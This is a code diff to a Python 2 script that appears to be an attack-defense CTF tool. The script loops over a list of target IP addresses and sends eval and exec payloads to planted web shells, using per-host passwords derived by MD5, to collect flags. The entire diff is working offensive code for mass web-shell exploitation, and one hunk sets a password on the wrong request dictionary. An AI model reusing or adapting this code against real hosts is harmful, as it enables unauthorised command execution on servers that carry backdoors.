@@ -2,7 +2,7 @@
 
 import requests
 from core.shells import *
-import re
+import re,hashlib
 #from core.ip_list import *
 
 #GET_eval_shells_path_pwd = {}
@@ -55,17 +55,19 @@ def get_flag():
     POST_exec_shells_path_pwd=Get_POST_exec_sap()
     print GET_eval_shells_path_pwd,POST_eval_shells_path_pwd,GET_exec_shells_path_pwd,POST_exec_shells_path_pwd
     global ipList
+    # print ipList
+    ipList = return_ip()
     print 'this'
     #global target
     #target = open('auxi/flags.txt','w')
     for i in ipList:
         for j in POST_eval_shells_path_pwd:
             eval_POST_data={}
-            eval_POST_data['pass']='Sn3rtf4ck'
-            eval_POST_data[POST_eval_shells_path_pwd[j]] =eval_file
+            eval_POST_data['pass']= hashlib.md5(str(i)+"you_can_not_guess_it!").hexdigest()
+            eval_POST_data[POST_eval_shells_path_pwd[j][0]] =eval_file
             url = "http://" + i + j
             try:
-                flag = requests.post(url,data = eval_POST_data,timeout=3)
+                flag = requests.post(url,data = eval_POST_data,proxies={"http":"127.0.0.1:8080"},timeout=3)
                 judege(url,flag)
             except:
                 print "error!"
@@ -75,9 +77,9 @@ def get_flag():
             print url
             try:
                 if '?' in k:
-                    flag = requests.get(url + '&' + GET_eval_shells_path_pwd[k] + "=" + eval_file)
+                    flag = requests.get(url + '&' + GET_eval_shells_path_pwd[k][0] + "=" + eval_file)
                 else:
-                    payload = {GET_eval_shells_path_pwd[k]:eval_file}
+                    payload = {GET_eval_shells_path_pwd[k][0]:eval_file}
                     flag = requests.get(url,params = payload,timeout=3)
                 judege(url,flag)
             except:
@@ -86,7 +88,7 @@ def get_flag():
         for m in GET_exec_shells_path_pwd:
             url = "http://" + i + m
             try:
-                payload = {GET_exec_shells_path_pwd[m]:exec_file}
+                payload = {GET_exec_shells_path_pwd[m][0]:exec_file}
                 flag = requests.get(url,params = payload,timeout=3)
                 judege(url,flag)
 
@@ -95,7 +97,8 @@ def get_flag():
 
         for n in POST_exec_shells_path_pwd:
             url = "http://" + i + n
-            exec_POST_data = {POST_exec_shells_path_pwd[n]:exec_file}
+            exec_POST_data = {POST_exec_shells_path_pwd[n][0]:exec_file}
+            eval_POST_data['pass']= hashlib.md5(str(i)+"you_can_not_guess_it!").hexdigest()
             try:
                 flag = requests.post(url,data = exec_POST_data,timeout=3)
                 judege(url,flag)
